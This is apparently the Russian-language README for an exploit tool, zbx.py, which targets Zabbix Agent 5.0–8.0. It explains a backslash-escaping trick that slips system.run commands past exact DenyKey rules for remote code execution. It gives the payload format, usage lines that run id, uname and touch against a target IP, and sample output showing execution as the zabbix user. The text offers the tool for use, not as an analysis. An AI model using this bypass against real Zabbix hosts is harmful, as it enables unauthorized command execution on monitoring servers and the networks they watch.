zbx.py - Zabbix Agent DenyKey Bypass RCE

Автор: bibakr
Связь: @void_is_our_signal

Что делает

Эксплуатирует уязвимость в Zabbix Agent для выполнения системных команд на удалённом хосте, даже если точное правило DenyKey должно их блокировать.

В чём уязвимость

Zabbix Agent обрабатывает ключи с разрывом нормализации между проверкой правил и запуском команды в shell. Парсер сохраняет обратные слеши в параметрах, матчер правил сравнивает необработанные строки, а shell при выполнении убирает обратные слеши.

Это позволяет командам, которые не совпали с DenyKey, выполниться как разрешённым.

Условия

Zabbix Agent 5.0–8.0 (C agent или Go agent2)
Удалённые команды разрешены через AllowKey=system.run[*] или EnableRemoteCommands=1
DenyKey с точным параметром, например: DenyKey=system.run[touch /tmp/file]

Как работает

Команда кодируется обратными слешами перед пробелами и слэшами. DenyKey не видит совпадения. Shell выполняет команду после снятия слешей.

Обычная команда: system.run[touch /tmp/file]

Байпас: system.run[\/usr\/bin\/touch \/tmp\/file]

Использование

python3 zbx.py <ip> <команда>

Примеры:

python3 zbx.py 127.0.0.1 id
python3 zbx.py 127.0.0.1 "uname -a"
python3 zbx.py 127.0.0.1 "touch /tmp/pwned"

Пример вывода

[*] connecting to 127.0.0.1:10050...
[+] agent alive
[*] running: id
[+] output:
uid=966(zabbix) gid=966(zabbix) groups=966(zabbix)
make by bibakr

Примечание

Дикий DenyKey=system.run[*] блокирует этот байпас. Уязвимость работает только против точных правил с параметром.